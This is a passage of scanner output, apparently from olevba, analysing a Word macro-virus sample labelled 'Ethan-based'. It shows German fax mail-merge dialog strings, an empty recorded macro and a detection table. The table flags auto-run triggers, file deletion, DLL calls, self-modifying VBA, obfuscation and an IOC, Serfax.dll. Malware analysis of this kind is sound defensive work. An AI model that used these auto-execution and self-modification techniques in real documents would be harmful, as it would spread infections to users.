chOverwritePriority = True
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub alles_druck()
Attribute alles_druck.VB_Description = "Makro aufgezeichnet am 04.03.99 von Gebhart Daniel"
Attribute alles_druck.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.alles_druck"
'
' alles_druck Makro
' Makro aufgezeichnet am 04.03.99 von Gebhart Daniel
'
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I. W�hlen Sie dasjenige Feld der Datenquelle, welches die Faxnummer enth�lt7�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�II. Geben Sie optional eine Kennung f�r Ihre Serienfax-Aktion an5%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�III. W�hlen Sie ein Feld aus der Datenquelle, welches zus�tzlich im Betreff Feld angegeben werden soll (optional)�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�IV. Starten Sie die Serienfax-Aktion5%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Serienfax starten
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Abbrechen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Optionen...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Priorit�ten in der Datenquelle �berschreiben
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Normal@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Niedrig
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nur Datens�tze von n�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�verwenden
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'comboFaxnoField'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtMailMergeID'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'comboExtraField'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdFax'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdCancel'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOptions'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'labPriority'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkOverwritePriority'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optHigh'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optNormal'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'OptLow'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i09'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'comboFrom'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'comboTo'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Ethan-based-92bfd82119e2b848b6312d4b1775b69812fab830c6a64e4311c07324ac29eb9c' - OLE stream: 'Macros/dlgMailMergeFaxOptions/i14'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|AutoExec  |cmdCancel_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |comboFaxnoField_Chan|Runs when the file is opened and ActiveX     |
|          |ge                  |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Serfax.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

